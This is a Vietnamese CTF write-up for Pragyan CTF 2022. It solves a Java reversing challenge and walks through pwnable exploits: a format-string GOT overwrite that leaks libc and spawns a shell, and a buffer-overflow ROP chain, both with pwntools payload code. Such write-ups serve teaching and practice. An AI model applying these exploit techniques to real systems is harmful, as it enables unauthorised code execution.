# Write-up Pragyan CTF 2022

| Challenge type                                             | 
| ------------------------------------------------------------ | 
| [WEB](#Web) | 
| [PWNABLE](#Pwnable) | 
| [REVERSE](#Reverse) | |
| [CRYPTOGRAPHY](#Crypto) | 

## Reverse
> ### Oak
Bài Này cho 1 file Oak.class.Mình decomplie ra được đoạn code sau:

    public static int t_helper(final int n, final int[] array) {
        if (array[n] != -1) {
            return array[n];
        }
        if (n == 0) {
            return array[0] = 0;
        }
        if (n == 1) {
            return array[1] = 1;
        }
        if (n == 2) {
            return array[2] = 3;
        }
        return array[n] = 3 * t_helper(n - 1, array) - 3 * t_helper(n - 2, array) + t_helper(n - 3, array);
    }
    
    public static int t(final int n) {
        final int[] array = new int[n + 1];
        for (int i = 0; i < array.length; ++i) {
            array[i] = -1;
        }
        return t_helper(n, array);
    }
    
    public static void main(final String[] array) {
        if (array.length != 1) {
            System.out.println("Usage: [flag]");
            return;
        }
        if (check(array[0])) {
            System.out.println("Correct!");
        }
        else {
            System.out.println("Incorrect");
        }
    }
    
    public static long[] conv(final String s) {
        final long[] array = new long[s.length()];
        for (int i = 0; i < s.length(); ++i) {
            array[i] = (s.charAt(i) << 8) + s.charAt((i + 1) % s.length());
        }
        return array;
    }
    
    public static boolean check(final String s) {
        final long[] conv = conv(s);
        for (int i = 0; i < conv.length; ++i) {
            if (Oak.data[i] != (conv[i] ^ (long)t(i * i))) {
                return false;
            }
        }
        return true;
    }
    
    static {
        Oak.data = new long[] { 28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L };
    }
}


Sau một lúc phân tích đoạn code thì được 1 chỗ quan trọng:

    public static boolean check(final String s) {
        final long[] conv = conv(s);
        for (int i = 0; i < conv.length; ++i) {
            if (Oak.data[i] != (conv[i] ^ (long)t(i * i))) {
                return false;
            }
        }
        return true;
    }
Tại hàm này thực hiện kiểm tra flag bằng vòng lặp kiểm tra từng kí tự và mình cũng không cần quan tâm hàm conv và hàm t làm gì.Để lấy flag mình chỉ cần thực hiện (Oak.data[i] ^ (long)t(i*i)) & 0xff.

    ArrayList<Long> arr = new ArrayList<Long>(); 
	for(int i = 0;i < 39;i++) {
	    arr.add((Oak.data[i] ^ t(i*i)) & 0xff ); 
    }
`Flag: p_ctf{0r1g1n4|_n@M3-0f_J4vA_Wa5_()/\|<}`

## Pwnable
> ### TBBT
Bạn cũng có thể tải challenge ở đây: [TBBT.zip](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/TBBT/TBBT.zip)
Trước tiên, ta sẽ sử dụng `file` để kiểm tra thông tin cơ bản:
```
$ file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5788619d307e852a6bb996dcf05536b6600823b6, for GNU/Linux 3.2.0, not stripped
```

Đây là file 32 bit không bị ẩn code. Tiếp theo, ta sẽ sử dụng `checksec` để kiểm tra tất cả các lớp bảo vệ của file:

```
$ checksec vuln
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Chỉ có `PIE enabled`. Cuối cùng, ta sẽ dịch ngược file với ghidra để hiểu được cách chương trình hoạt động. Hàm main() không có gì thú vị ngoại trừ lệnh lin().

Trong hàm lin(), trước tiên nó kiểm tra xem đầu vào của chúng ta (là các giá trị khi ta nhập trong hàm main()) có chứa bất kỳ ký tự nào trong chuỗi `3456789:;\357ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ` của biến toàn cục `arr` hay không. Nếu input của chúng ta có ký tự với chuỗi đó thì chương trình sẽ thoát, nhưng nếu không, ta có thể thực thi đoạn code bên dưới hàm check.

![image](https://user-images.githubusercontent.com/30711980/157253864-68600082-d081-4f06-87b5-f30cd0e51668.png)

Khi thực thi tới đoạn code như ảnh trên, đầu tiên chương trình sẽ fget(local_90, 0x7f, stdin) và sau đó là printf(local_90). Chờ đã, ta thấy rằng hàm printf không có bất kỳ định dạng nào cho biến local_90 -> **Format string** .

Sau hàm printf() là fflush() và putchar() trông có vẻ không thú vị.

Đó là tất cả những gì chúng ta có thể tìm thấy. Bây giờ chúng ta hãy chuyển sang phần tiếp theo: Ý tưởng!
Vì chương trình chỉ thực hiện 1 lần nên nếu chúng ta nhảy vào hàm lin() và thực hiện printf thành công thì chúng ta vẫn kết thúc chương trình và không thể làm gì khác. Vì vậy, điều đầu tiên chúng ta cần làm là ghi đè fflust@got hoặc putchar@got để nhảy trở lại hàm lin() nhưng ở vị trí sau khi kiểm tra input với biến toàn cục `arr`.

Tiếp theo, ta sẽ cần phải leak địa chỉ `__libc_start_main_ret` để tìm libc tương ứng cho cuộc tấn công tiếp theo.

Cuối cùng, chúng ta sẽ ghi đè printf@got bằng system() để khi chúng ta fget() một lần nữa, chúng ta chỉ cần nhập `/bin/sh` và khi chương trình thực thi printf(), nó chỉ thực thi system("/bin/sh") và chúng ta tạo được shell.

P/s: Mình nhận ra rằng nó cho mình địa chỉ của main là do chúng ta có một hàm tên là nic() có thể làm một cái gì đó thú vị nhưng mình nghĩ đó là cờ giả vì khi mình lấy shell thì có 2 tệp được gọi `flag` và `not_flag`. Vì vậy cách của chúng ta là tốt nhất. 

- Tóm lược:
  1. Ghi đè fflush@got thành `lin () + 116`
  2. Leak địa chỉ `__libc_start_main_ret` 
  3. Ghi đè printf@got thành system()
Ta sẽ chuyển đến hàm lin() với đoạn code bên dưới vì hàm main() không có gì để chúng ta tập trung:

```
# Get the main address and binary base address
p.sendlineafter(b'your name? \n', b'AAAAAAAA')
p.recvline()
main_addr = int(p.recvline()[:-1].split(b'. is ')[1], 16)
log.success("Main address: " + hex(main_addr))
exe.address = main_addr - exe.sym['main']
log.success("Exe address: " + hex(exe.address))

p.sendlineafter(b'2.No', b'1')
p.sendlineafter(b'2.No', b'1')
p.sendlineafter(b'2.No', b'\x01')    # Jump to lin() now
```

Lý do vì sao mình send `\x01` ở dòng cuối cùng là bởi vì như bên trên ta đã nói, ở đầu hàm lin(), có một vòng for dùng để kiểm tra xem mỗi ký tự khi ta nhập ở hàm main() (đầu vào ở trên là `0x013131`) có xuất hiện trong chuỗi `arr` hay không và sẽ thoát hoặc tiếp tục thực thi tương ứng. Để tránh việc kết thúc, mình chỉ đơn giản sử dụng `\x01`.
Đầu tiên, chúng ta sẽ muốn biết tại `%p` thứ mấy sẽ trỏ tới phần đầu của dữ liệu mà ta nhập vào:

p.sendlineafter(b'your name? \n', b'AAAAAAAA')
p.recvline()
main_addr = int(p.recvline()[:-1].split(b'. is ')[1], 16)
log.success("Main address: " + hex(main_addr))
exe.address = main_addr - exe.sym['main']
log.success("Exe address: " + hex(exe.address))

Và ta biết rằng tại `%7$p` sẽ trỏ về phần đầu của chuỗi:

![image](https://user-images.githubusercontent.com/30711980/157254510-195a9158-eb65-4a59-8c99-62522e36fca7.png)

Vì đây là tệp 32 bit nên ta chỉ việc đặt địa chỉ của fflush@got ở payload và thay đổi giá trị bằng `%n`. Để ghi đè fflush@got `bằng lin()+116` (Ví dụ là `0x565ae6a7`), chúng ta không thể ghi gửi `0x565ae6a7` ký tự lên server để ghi đè vào fflush@got được vì đó là một số rất lớn và sẽ mất nhiều thời gian để thực thi.

Để giải quyết vấn đề này, ta sẽ chia địa chỉ thành một nửa và viết 2 byte của `fflush@got` với 2 byte thấp của địa chỉ `lin()+116` và 2 byte của `fflush@got+2` với 2 byte cao của địa chỉ `lin()+116`. Với ví dụ về địa chỉ lin() ở trên, chúng ta sẽ muốn ghi `0x565ae6a7` vào fflush@got (ví dụ đang chứa `0x11111111`), vì vậy chúng ta sẽ thay đổi theo thứ tự như sau:

```
# fflush@got = 0x11111111
# Overwrite fflush@got with 2 lower bytes: 0xe6a7
# fflush@got = 0x1111e6a7
# Overwrite fflush@got+2 (the address is added with 2) with 2 higher bytes: 0x565a
# fflush@got = 0x565ae6a7
```

Để làm điều đó, ta sẽ cần đặt địa chỉ của fflush@got trên stack và chọn offset của `%p` để có thể trỏ tới địa chỉ của fflush@got của payload:

```
payload = p32(exe.got['fflush'])
payload += b'PPPP'
payload += p32(exe.got['fflush']+2)
payload += b'%c'*5
payload += b'%c%p'          # %c point to some address before payload and %p point to 'exe.got['fflush']'
payload += b'%c%p'          # %c point to 'PPPP' and %p point to 'exe.got['fflush']+2'
p.sendlineafter(b'But....', payload)
p.recvline()
print(p.recvline())
print(hex(exe.got['fflush']))
```

Thực thi script và chúng ta có thể thấy được địa chỉ `fflust@got` và `fflust@got+2`:

![image](https://user-images.githubusercontent.com/30711980/157254771-c8ec5d0f-f811-44d9-814e-17527a21894a.png)

Bây giờ, ta sẽ lấy địa chỉ của `lin()+116` và chia thành 2 phần:

```
lin_addr_middle_hex = hex(exe.sym['lin'] + 116)
part1 = int(lin_addr_middle_hex[-4:], 16)        # Lower bytes
part2 = int(lin_addr_middle_hex[-8:-4], 16)      # Higher bytes
```

Ta sẽ muốn thay đổi 2 byte thấp hơn trước bằng cách sử dụng `%hn` để viết 2 byte và ta sẽ sử dụng `%<k>c` với `k` là số byte dùng cho số byte của pad để ta không cần phải gửi một lúc nhiều byte đến máy chủ:

```
payload = p32(exe.got['fflush'])           # 4 bytes
payload += b'PPPP'                         # 4 bytes
payload += p32(exe.got['fflush']+2)        # 4 bytes
payload += b'%c'*5                         # 5 bytes
payload += '%{}c%hn'.format(part1 - 17).encode()
payload += b'%c%p'
p.sendlineafter(b'But....', payload)
p.recvline()
print(p.recvline())
print(hex(exe.got['fflush']))
```

Chúng ta muốn ghi `part1`  nhưng trước `part1`, ta đã ghi một số byte. Vì vậy ta chỉ cần lấy `part1` trừ với số byte đó và chúng ta sẽ có được số byte chính xác mà chúng ta muốn ghi. Chạy và debug bằng GDB, ta thấy rằng địa chỉ đã thay đổi:

![image](https://user-images.githubusercontent.com/30711980/157255084-22e6302c-d820-4614-bacd-753659d24f5c.png)

Chúng ta có thể thấy rằng 2 byte thấp hơn đã được thay đổi thành công và chính xác. Bây giờ là lúc cho 2 byte cao hơn, nhưng trước tiên, hãy thử với `%hn` mà không có bất kỳ byte thêm nào của padding. Payload sẽ trở thành:

```
payload = p32(exe.got['fflush'])
payload += b'PPPP'
payload += p32(exe.got['fflush']+2)
payload += b'%c'*5
payload += '%{}c%hn'.format(part1 - 17).encode()
payload += b'%c%hn'                               # Change  here
p.sendlineafter(b'But....', payload)
p.recvline()
print(p.recvline())
print(hex(exe.got['fflush']))
```

Thực thi script và ta có:

![image](https://user-images.githubusercontent.com/30711980/157255175-d8fd9c9c-e8b9-4611-9c96-fb20fa128bfe.png)

Ta thấy rằng 2 byte cao hơn sẽ lấy số byte trước nó (`0xe577`) cộng thêm 1 (của `%c`) trước `%hn`. Vì vậy, ta chỉ cần lấy byte cao hơn và trừ với 2 byte thấp hơn và ghi vào fflush@got là xong.

Có một vấn đề, nếu 2 byte cao hơn đó nhỏ hơn 2 byte thấp hơn, phép trừ sẽ dẫn đến một số âm. Để tránh điều đó, ta sẽ cộng thêm 2 byte cao hơn với `0x10000` khi 2 byte cao nhỏ hơn 2 byte thấp.

Và với `%hn` (tức là chỉ ghi nhiều nhất 2 byte, không lấn sang byte thứ 3), thì số `0x1` trong byte thứ ba sẽ không được viết. Vì vậy, sau khi ta tách địa chỉ của `lin()+116`, ta sẽ thêm dòng kiểm tra này:

```
lin_addr_middle_hex = hex(exe.sym['lin'] + 116)
part1 = int(lin_addr_middle_hex[-4:], 16)        # Lower bytes
part2 = int(lin_addr_middle_hex[-8:-4], 16)      # Higher bytes
if part2<part1:                                  # Add this
    part2 += 0x10000
```

Và ta sẽ viết 2 byte cao hơn vào địa chỉ `fflush@got+2` với đoạn mã sau:

```
payload = p32(exe.got['fflush'])
payload += b'PPPP'
payload += p32(exe.got['fflush']+2)
payload += b'%c'*5
payload += '%{}c%hn'.format(part1-17).encode()
payload += '%{}c%hn'.format(part2-part1).encode()
p.sendlineafter(b'But....', payload)
p.recvline()
```

Sau khi thực thi script, ta có thể thấy rằng fflush@got đã thay đổi thành công:

![image](https://user-images.githubusercontent.com/30711980/157290321-d49c8c9a-7113-457f-bdf3-746827d56483.png)

Tốt lắm! Hãy chuyển sang giai đoạn tiếp theo nào: Leak địa chỉ `__libc_start_main_ret`!
Bởi vì ta chỉ việc leak địa chỉ và không bắt buộc phải thay đổi bất kỳ thứ gì nên ta sẽ bao gồm code để leak địa chỉ `__libc_start_main_ret` với payload ghi đè fflush@got bên trên. Nhưng trước tiên, ta sẽ kiểm tra vị trí của `__libc_start_main_ret` khi dừng tại printf():

```
gef➤  x/100xw $esp
0xfff0cf90: 0xfff0cfac  0x0000007f  0xf7f3e580  0x56575517
0xfff0cfa0: 0x00000002  0x000007d4  0x0000000b  0x56577514    <-- Our input here
0xfff0cfb0: 0x50505050  0x56577516  0x63256325  0x63256325
0xfff0cfc0: 0x32256325  0x33363831  0x6e682563  0x33323225
0xfff0cfd0: 0x6e682563  0x24373825  0x00000a70  0xf7dc55b0
0xfff0cfe0: 0xfff0d048  0x000003e9  0xf7dd1b7d  0xf7f3f5e0
0xfff0cff0: 0xf7f3ed20  0x0000000b  0xfff0d038  0xc27ced00
0xfff0d000: 0xf7f3ed20  0x0000000a  0x0000000b  0x565774fc
0xfff0d010: 0xf7f3e000  0xf7f3e000  0xfff0d0e8  0xf7da8469
0xfff0d020: 0xf7f3e580  0x565760f6  0xfff0d044  0x0000003a
0xfff0d030: 0xf7f3e000  0x565774fc  0xfff0d0e8  0x565758e4
0xfff0d040: 0x57e481a2  0xf7f3e000  0xfff0d0e8  0x56575806
0xfff0d050: 0xfff0d08a  0xf7f7589c  0xf7f758a0  0x00003001
0xfff0d060: 0xf7f76000  0xf7f758a0  0xfff0d08a  0x00000001
0xfff0d070: 0x00000000  0x00c30000  0x00000001  0xf7f757e0
0xfff0d080: 0x00000000  0x00000000  0x00004034  0xc27ced00
0xfff0d090: 0x029c67af  0x00000534  0x0000008e  0xf7f3ca80
0xfff0d0a0: 0x00000000  0xf7f3e000  0xf7f757e0  0xf7f41c68
0xfff0d0b0: 0xf7f3e000  0xf7f5b2f0  0x00000000  0xf7d8b402
0xfff0d0c0: 0xf7f3e3fc  0x00000001  0x565774fc  0x565759c3
0xfff0d0d0: 0x41410001  0x41414141  0x000a4141  0x57e481a0
0xfff0d0e0: 0xfff0d100  0x00000000  0x00000000  0xf7d71ee5    <-- __libc_start_main_ret
0xfff0d0f0: 0xf7f3e000  0xf7f3e000  0x00000000  0xf7d71ee5
0xfff0d100: 0x00000001  0xfff0d194  0xfff0d19c  0xfff0d124
0xfff0d110: 0xf7f3e000  0xf7f76000  0xfff0d178  0x00000000
```

> P / s: `__libc_start_main_ret` là nơi mà main() ret đến

Sau khi đếm offset, ta thấy rằng `%87$p` sẽ trỏ đến địa chỉ `__libc_start_main_ret`. Vì vậy, payload ở giai đoạn 1 của chúng ta sẽ viết thêm `%87$p` (không cần phải overwrite nên sử dụng format `%<k>$p` là ổn) vào payload như sau:

```
payload = p32(exe.got['fflush'])
payload += b'PPPP'
payload += p32(exe.got['fflush']+2)
payload += b'%c'*5
payload += '%{}c%hn'.format(part1-17).encode()
payload += '%{}c%hn%87$p'.format(part2-part1).encode()    # Add here
p.sendlineafter(b'But....', payload)
p.recvline()
```

Thực thi script và ta lấy được địa chỉ:

![image](https://user-images.githubusercontent.com/30711980/157255649-e206180a-73d0-437b-9096-9dd6f2a4dabb.png)

Kiểm tra trong GDB và đó là địa chỉ chính xác:

![image](https://user-images.githubusercontent.com/30711980/157255669-b131cd3b-ddee-4903-8866-18ac88247b29.png)

Vì vậy, ta sẽ lấy địa chỉ này và tính toán địa chỉ base của libc với đoạn code sau:

```
__libc_start_main_ret = int(p.recvline().split(b'0x')[-1], 16)
log.success("__Libc_start_main_ret: " + hex(__libc_start_main_ret))
libc.address = __libc_start_main_ret - libc.sym['__libc_start_main_ret']
log.success("Libc base: " + hex(libc.address))
print(hex(exe.got['fflush']))
print(hex(exe.sym['lin'] + 116))
```

Bây giờ, ta sẽ chuyển sang bước cuối cùng: Ghi đè printf@got thành system()!
Ở giai đoạn này, ta sẽ làm tương tự như ta đã làm trong giai đoạn 1, vì vậy đây là code cho giai đoạn 3:

```
system_addr_hex = hex(libc.sym['system'])
part1 = int(system_addr_hex[-4:], 16)
part2 = int(system_addr_hex[-8:-4], 16)
if part2<part1:
    part2 += 0x10000

payload = p32(exe.got['printf'])
payload += b'PPPP'
payload += p32(exe.got['printf']+2)
payload += b'%c'*10
payload += '%{}c%hn'.format(part1-22).encode()
payload += '%{}c%hn'.format(part2-part1).encode()
# payload = b'AAAA'
# payload += b'%p'*0x20
p.sendline(payload)
data = p.recvline()
```

Sau khi thực thi code thành công, ta chỉ cần nhập chuỗi `/bin/sh` và printf() sẽ thực thi system() với tham số là chuỗi `/bin/sh`.

Full code: [solve.py](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/TBBT/solve.py)  
![image](https://user-images.githubusercontent.com/30711980/157255829-d31b4631-7705-441b-a77a-be414d0937b8.png)

`Flag: p_ctf{Sh3ld0N_1s_H4ppY_1H4t_u_4re_h4cK3R_7u9r4J}`

> ### Comeback
Bạn cũng có thể tải xuống challenge ở đây: [comeback.zip](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/comeback/comeback.zip)
Zip sẽ chứa 2 file:
- vuln
- libvuln.so  
Tải xuống và giải nén tệp, sau đó sử dụng `patchelf` để xem libc mà file `vuln` sẽ thực thi chung khi chạy:
```
$ patchelf --print-needed vuln
./libvuln.so
libc.so.6
```
Trước tiên, ta sử dụng `file` để kiểm tra thông tin cơ bản:

```
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab8859ed41701faf63db022982c9ad5b4e32ef98, for GNU/Linux 3.2.0, not stripped

$ file libvuln.so
libvuln.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=0d3c1de134716c37b6cae35304cc0a31eb0f6a84, not stripped
```

Vậy file `vuln` là một file thực thi 32 bit không bị ẩn code và file  `libvuln.so` là một đối tượng được chia sẻ cũng không bị ẩn code. Tiếp theo, ta sẽ sử dụng `checksec` để kiểm tra tất cả các lớp bảo vệ của `vuln`:

```
$checksec vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  './'
```

Chỉ có `NX enabled` được bật. Cuối cùng, ta dịch ngược tệp `vuln` bằng ghidra để có cái nhìn rõ hơn về chương trình. Lúc đầu, chương trình chạy trong hàm main() nhưng không có gì thú vị. Tiếp theo, nó chuyển đến new_main() trông thú vị hơn:

![image](https://user-images.githubusercontent.com/30711980/157141108-7d2e991d-b061-48b2-970a-ddb652d14c62.png)

Biến được định nghĩa với kích thước là 44 nhưng chúng ta có thể đọc tối đa 0x200 byte -> **Buffer Overflow**.

Và ta có thể nhận thấy rằng có một hàm được gọi là sysfuncs():

![image](https://user-images.githubusercontent.com/30711980/157141142-ca32507e-8306-432a-ab0a-49f8cf6f5fe2.png)

Trong sysfuncs(), nó thực thi 3 hàm lạ tên là tryOne(), tryTwo() và tryThree() mà chúng ta không thể tìm thấy trong file `vuln`, nhưng có thể trong `libvuln.so` sẽ chứa các hàm này. 

Vì vậy ta sẽ dịch ngược file `libvuln.so` để tìm hiểu các hàm đó và thực thi để có thể hiểu được các hàm đang làm gì. Ta sẽ dùng bug **Buffer Overflow** để overwrite return address và bắt chương trình thực thi hàm sysfuncs để có thể hiểu rõ về các hàm tryOne() đến tryThree():

```
payload = cyclic(52)                         # Padding to eip
payload += p32(exe.sym['sysfuncs'] + 59)     # 
p.sendafter(b'All the Best :)', payload)
```

Với `sysfuncs () + 59`, ta sẽ có mã assembly như này:

```
   0x08049291 <+59>:    push   0x6
   0x08049293 <+61>:    push   0x5
   0x08049295 <+63>:    push   0x4
   0x08049297 <+65>:    call   0x8049130 <tryOne@plt>
```

Chạy script, debug với GDB và dừng ngay hàm đầu tiên của function tryOne(), ta có thể thấy rằng hàm thực thi câu lệnh này:

```
sprintf(p1, "%p", 4)
```

Tức là nó sẽ ghi chuỗi `0x4` vào biến toàn cục `p1`:

```
gef➤  x/xw &p1
0xf7f3d078 <p1>:    0x00347830        # '0x4'

gef➤  x/xw &p2
0xf7f3d06c <p2>:    0x00000000

gef➤  x/xw &p3
0xf7f3d084 <p3>:    0x00000000

gef➤  x/xw &p4
No symbol table is loaded.  Use the "file" command.
```

Chúng ta cũng có thể thấy rằng không chỉ có p1 mà còn có các biến toàn cục p2 và p3. Tiếp theo, hàm tryOne() sẽ tiếp tục thực thi các hàm này:

```
sprintf(p2, "%p", 5)
sprintf(p3, "%p", 6)
```

Bạn có biết số 4, 5 và 6 được lấy từ đâu để chuyển cho sprintf() không? Đó là con số mà nó nhận được từ 3 lần push trước đó trước khi chúng ta đi vào hàm tryOne () của code tại địa chỉ `sysfuncs() + 59`.

Sau 3 lệnh sprintf() đó, nó sẽ đưa biến toàn cục `check_p1` vào hàm `__encrypt`. Ta hãy xem coi biến `check_p1` đó chứa những gì

```
gef➤  x/3xw &check_p1
0xf7f3d040 <check_p1>:  0x4f512c03  0x55453e48  0x00005027

gef➤  x/3xw &check_p2
0xf7f3d04c <check_p2>:  0x1a532c03  0x51443e19  0x00005324

gef➤  x/3xw &check_p3
0xf7f3d058 <check_p3>:  0x1a512c03  0x51413e19  0x00005321

gef➤  x/3xw &check_p4
No symbol table is loaded.  Use the "file" command.
```

Như chúng ta có thể mong đợi rằng chỉ có 3 biến check tương ứng với 3 biến toàn cục `p1`, `p2` và `p3`. Chúng ta biết rằng 3 biến toàn cục `p1`, `p2` và `p3` lấy giá trị từ sprintf () nhưng 3 biến check `check_p1`, `check_p2` và `check_p3`, ta không thể thấy nó lấy giá trị từ đâu.

Với các lần chạy khác nhau, chúng ta thấy rằng 3 biến check vẫn giống nhau và nó chứa cùng một giá trị nên ta không thể thay đổi 3 biến check đó. Vậy ta hãy xem tiếp khi nó đi đến hàm strcmp() để so sánh `p1` với `check_p1` sau `__encrypt`:

![image](https://user-images.githubusercontent.com/30711980/157141166-033c5a80-974e-4abf-ae13-26fbc0e8318d.png)

Chúng ta có thể thấy rằng nó so sánh chuỗi `0x4` (lấy từ đối số) với chuỗi `0xdeadbeef`(không thể thay đổi). Vì vậy, nếu chúng ta truyền đối số với số `0xdeadbeef` (số định dạng hex), thì nó sẽ giống như chuỗi `0xdeadbeef` sau khi sprintf() với `%p`. Chúng ta sẽ tiếp tục kiểm tra 2 hàm strcmp() kế tiếp để xem các giá trị kiểm tra tiếp theo là gì.

Ta chạy tiếp và dừng lại ở câu lệnh này (trong GDB):

```
 → 0xf7f3a401 <tryOne+164>     jne    0xf7f3a45b <tryOne+254>   TAKEN [Reason: !Z]
```

Và ta gõ:

```
flags +zero
```

Vậy là ta có thể bỏ qua bước kiểm tra này để đi đến hàm strcmp thứ hai:

![image](https://user-images.githubusercontent.com/30711980/157141190-eeeb16cb-104e-4d00-b3d4-a375425f1636.png)

Ta có thể thấy rằng ở strcmp thứ hai, nó so sánh chuỗi `0x5` với `0xf00dcafe`, và ta cũng có thể thỏa mãn điều kiện này.

Tiếp tục kiểm tra và ta nhận được:

![image](https://user-images.githubusercontent.com/30711980/157141203-c76cea18-2a56-4c1d-9589-bd62fb64029d.png)

Ở hàm strcmp cuối cùng, nó so sánh chuỗi `0x6` với `0xd00dface` và ta cũng có thể đáp ứng điều này.

Sau 3 lần kiểm tra ở hàm tryOne(), nếu thỏa mãn thì biến toàn cục `set` được gán giá trị 1:

!![image](https://user-images.githubusercontent.com/30711980/157141218-7a428e21-cb1d-4f60-81e5-e66e67020210.png)

Và với hàm tryTwo() và tryThree() cũng sẽ tương tự như tryOne(). Vì vậy, chúng ta cùng chuyển sang phần tiếp theo: Ý tưởng!
Với tryThree(), nếu tất cả các kiểm tra được thỏa mãn bao gồm cả 3 đối số đều đúng và `set` bằng 2 (yêu cầu chúng ta thực hiện tryOne() xong tới tryTwo() trước), chúng ta có thể lấy được cờ. Do đó, mục đích là thực thi tryOne() sau đó tryTwo() và cuối cùng là tryThree()

P/s: Khi writeup, mình nhận thấy rằng chúng ta cũng có thể sử dụng ret2libc để spawn shell sau đó lấy cờ.

- Tóm lược: 
   1. Thực thi tryOne()
   1. Thực thi tryTwo()
   1. Thực thi tryThree()
Như chúng ta biết rằng chương trình đẩy đối số lên stack trước rồi sau đó `call` hàm tryOne() (lệnh `call` sẽ đặt địa chỉ trả về trên stack). Ngăn xếp sẽ trông như thế này khi nó chuyển đến đầu của tryOne ():

```
0xffe46100│+0x0000: 0x0804929c    <-- Return address
0xffe46104│+0x0004: 0x00000004    <-- Argument 1
0xffe46108│+0x0008: 0x00000005    <-- Argument 2
0xffe4610c│+0x000c: 0x00000006    <-- Argument 3
```
Vậy ta có format cho việc thực thi các hàm tryOne(), tryTwo() và tryThree() như sau:

```
payload = <padding to eip> + <địa chỉ trả về> + <đối số 1> + <đối số 2> + ...
```

Vì vậy payload đầu tiên của ta sẽ trông như thế này:

```
payload = cyclic(52)
payload += flat(exe.sym['tryOne'])
payload += flat(exe.sym['main'])     # Return address
payload += p32(0xdeadbeef)           # Argument 1
payload += p32(0xf00dcafe)           # Argument 2
payload += p32(0xd00dface)           # Argument 3
p.sendafter(b'All the Best :)', payload)
```

Chúng ta sẽ muốn chương trình sau khi thực thi hàm tryOne() sẽ trở về main để chúng ta có thể tiếp tục nhập dữ liệu, từ đó thực thi hàm tryTwo() và tryThree(). Và bởi vì biến toàn cục `set` nên nếu chúng ta hoàn thành hàm tryOne(), nó sẽ được gán giá trị 1. Và khi ta hoàn thành thực thi hàm tryTwo(), biến `set` sẽ được gán với giá trị 2, từ đó giúp ta lấy cờ ở hàm tryThree().

Sau khi thực thi script, ta có thể thấy rằng nó in ra chuỗi `Nice Try` và đợi đầu vào:

![image](https://user-images.githubusercontent.com/30711980/157141254-2b94d0a5-466d-44f0-99a8-384abb201659.png)

Vì vậy, ta hãy chuyển sang giai đoạn 2: Thực hiện tryTwo()
Ta vẫn debug với GDB để biết thứ tự cũng như chuỗi nào nào sẽ được kiểm tra, và ta có payload như sau (chỉ cần dừng lại ở strcmp() và ta sẽ biết được ta cần so sánh chuỗi nào):

```
payload = cyclic(52)
payload += flat(exe.sym['tryTwo'])
payload += flat(exe.sym['main'])
payload += p32(0xf00dcafe)
payload += p32(0xd00dface)
payload += p32(0xdeadbeef)
p.sendafter(b'All the Best :)', payload)
```
Giai đoạn 3 cũng giống như trên:

```
payload = cyclic(52)
payload += flat(exe.sym['tryThree'])
payload += flat(exe.sym['main'])
payload += p32(0xd00dface)
payload += p32(0xdeadbeef)
payload += p32(0xf00dcafe)
p.sendafter(b'All the Best :)', payload)
```

Và ta lấy được cờ.

Full code: [solve.py](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/comeback/solve.py)  
![image](https://user-images.githubusercontent.com/30711980/157141326-3381dc15-1a56-4228-999b-51a7e15b34c7.png)  

`Flag: p_ctf{y3s_1t_w4s_a_R0p_4gh2e7c0}`

> ### Database 
Bạn cũng có thể tải challenge ở đây: [database.zip](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/database/database.zip)  
Trước tiên, ta sẽ sử dụng `file` để kiểm tra thông tin cơ bản:

```
$ file database
database: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=ea160318b25c1dc13c8efa64734a4ee03f502630, not stripped
```

Đây là tệp 64-bit không bị ẩn code. Tiếp theo, ta sẽ sử dụng `checksec` để kiểm tra tất cả lớp phòng thủ:

```
$ checksec database
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Ta có thể thấy rằng chỉ có `RELRO` là tắt, vì vậy ta có thể ghi đè bất kỳ địa chỉ ta muốn lên bất kỳ @got nào . Cuối cùng, ta sẽ sử dụng ghidra để dịch ngược tệp.

Có một số hàm nhưng ta nhận thấy có một hàm được gọi là secret(). Hàm secret() sẽ in ra cờ khi ta thực thi nó:

![image](https://user-images.githubusercontent.com/30711980/157140913-391644cf-2f25-4154-a073-2440b127e3e1.png)

Lúc đầu, mình đã không kiểm tra kỹ nên không thấy hàm này, mình đã tấn công tcache và sau đó lợi dụng tính link list của tcache để lấy cờ. Bạn có thể đọc code ở đây [here](https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/Pragyan-CTF-2022/database/solve_1.py)

Quay lại hàm main(), ta có thể thấy rằng có 4 hàm được gọi là `print_items`, `insert_item`, `update_item` và `delete_item`. Hàm đầu tiên `print_items` sẽ kiểm tra xem biến toàn cục `len` có bằng 0 hay không. Nếu không thì in ra chunk đó với kích thước được lưu trong `database`.

Chức năng thứ hai `insert_item` chỉ đơn giản là yêu cầu độ dài, sau đó malloc với độ dài đó và yêu cầu ta nhập dữ liệu. Sau đó địa chỉ chunk và kích thước sẽ được lưu vào `database`.

